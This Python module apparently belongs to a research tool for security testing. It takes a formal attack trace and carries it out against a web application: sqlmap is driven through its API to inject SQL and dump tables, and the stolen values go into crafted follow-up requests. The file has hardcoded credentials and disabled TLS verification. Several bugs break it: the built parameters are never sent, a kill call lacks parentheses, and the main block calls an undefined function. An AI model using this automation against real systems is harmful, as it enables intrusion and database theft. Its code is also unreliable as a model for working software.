#!/usr/local/bin/python3.5

"""
This module provides functionalities for parsing a
Message Sequence Chart attack trace in Alice and Bob motation.
"""


import re
import global_var
import requests
import linecache
import parser
from my_print import cprint
# disable warnings when making unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import wrapper.sqlmap
import json
import threading

# global request
s = None

# takes an attack trace and an extension matrix, and execute the attack
def execute_attack(msc_table,extension_sqli,file_aslanpp):
    global s
    cprint("Executing the attack trace","INFO")

    # general fields for sperforming an HTTP request
    url = None
    method = None
    params = None
    mapping = None
    
    # specific for executing sqlmap
    data_to_extract = []

    # sqlmap output
    sqlmap_output = None
    
    # request session object for performing subsequent HTTP requests
    s = requests.Session()

    # loop the msc_table and find when to perform an attack
    for idx, message in enumerate(msc_table):
        if not "webapplication" in msc_table[idx][1][0]:
             if "a" in extension_sqli[idx][0]:
                 cprint("sqli attack","DEBUG")
                 url, method, params, data_to_extract = parser.request_details(idx,msc_table, file_aslanpp, extension_sqli)
                 if not data_to_extract:
                     cprint("No valid data to be extracred from the database","WARNING")
                 # for the execution we need (url,method,params,data_to_extract)
                 # data_to_extract => table.column
                 sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
                 cprint(sqlmap_output,"DEBUG")
                 if not sqlmap_output:
                     cprint("No data extracted from the database","WARNING")
                     exit()
             elif "e" in extension_sqli[idx][0]:
                 # exploit the sqli here, which is also a normal request where we use
                 # the result from sqlmap
                 cprint("exploit sqli here, crafted request","DEBUG")
                 url, method, params, mapping = parser.request_details(idx,msc_table, file_aslanpp)
                 # for each p in params we need to instantiate it, either with the constant
                 # present in the annotation or with something from sqlmap_output
                 req_params = {}
                 cprint(mapping,"DEBUG")
                 for p in params:
                     p_key = p[0]
                     p_value = p[1]
                     if p_value == "?":
                         # it means we need to provide some value
                         for mapping_key,mapping_value in mapping.items():
                             tblcol = mapping_value.replace(" ","").split(".")
                             candidate_values = sqlmap_output[tblcol[0]][tblcol[1]]
                             cprint(candidate_values,"DEBUG")
                             req_params[p_key] = candidate_values[0]
                     else:
                         # we leave the param with the default value
                         req_params[p_key] = p_value
                 cprint(req_params,"DEBUG")
                 execute_request(url,method,params)
             elif "n" in extension_sqli[idx][0]:
                 # normal http request
                 cprint(msc_table[idx][0],"DEBUG")

# parameters for configuring the requests maker:
# Requests group
# - basic authentication params
# - SSL verification: True, False, CA path
# - proxy
# - proxy-cred
# - sqlmap usage

def execute_request(url, method, params):
    global s
    #url = 'https://157.27.244.25/chained'
    headers = {'user-agent': 'my-app/0.0.1'}
    #proxy = {"http" : "http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = None
    if method == "GET":
        r = s.get(url,params=params, verify=False, auth=('regis','password'))
    else:
        r = s.post(url, data = params, verify=False, auth=('regis','password'))
    #r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
    print(r.text)


def execute_sqlmap(url,method,params,data_to_extract):
    cprint("Execute sqlmap","DEBUG")
    wrapper.sqlmap.run_api_server()
    task = wrapper.sqlmap.new_task()
    wrapper.sqlmap.set_option("authType","Basic",task)
    wrapper.sqlmap.set_option("authCred","regis:password",task)

    url_params = ""
    for key,value in params:
        url_params = url_params+"&"+key+"="+value
    if method == "GET":
        wrapper.sqlmap.set_option("url",url+"/"+url_params,task)
    elif method == "POST":
        wrapper.sqlmap.set_option("url",url,task)
        wrapper.sqlmap.set_option("data",url_params,task)
    wrapper.sqlmap.set_option("dumpTable","true",task)
    for tblcol in data_to_extract:
        tbl_list = tblcol.split(".")
        cprint(tbl_list[0],"DEBUG")
        wrapper.sqlmap.set_option("tbl",tbl_list[0],task)

    #wrapper.sqlmap.set_option("data","username=?&password=?",task)
    #wrapper.sqlmap.set_option("tbl","users",task)

    wrapper.sqlmap.start_scan(url,task)
    cprint(url,"DEBUG")
    cprint(method,"DEBUG")
    cprint(params,"DEBUG")
    cprint(data_to_extract,"DEBUG")

    stopFlag = threading.Event()
    sqlmap_output = ""
    while not stopFlag.wait(5):
        r = wrapper.sqlmap.get_status(task)
        if "terminated" in r:
            cprint("Analysis terminated","DEBUG")
            sqlmap_output = wrapper.sqlmap.get_data(task)
            stopFlag.set()
        else:
            cprint("Analysis in progress ... ","DEBUG")
    
    # Let's parse the data extracted
    cprint(sqlmap_output,"DEBUG")
    extracted_values = {}
    #TODO: check errors in the sqlmap_output
    for tblcol in data_to_extract:
        tbl_list = tblcol.split(".")
        cprint(tbl_list[1],"DEBUG")
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            cprint("error in the sqlmap output","ERROR")
            wrapper.sqlmap.kill
            cprint(sqlmap_output,"DEBUG")
            exit()
        cprint("Ending sqlmap extraction","DEBUG") 
        wrapper.sqlmap.kill()
    return extracted_values

if __name__ == "__main__":
    execute_normal_request("c")

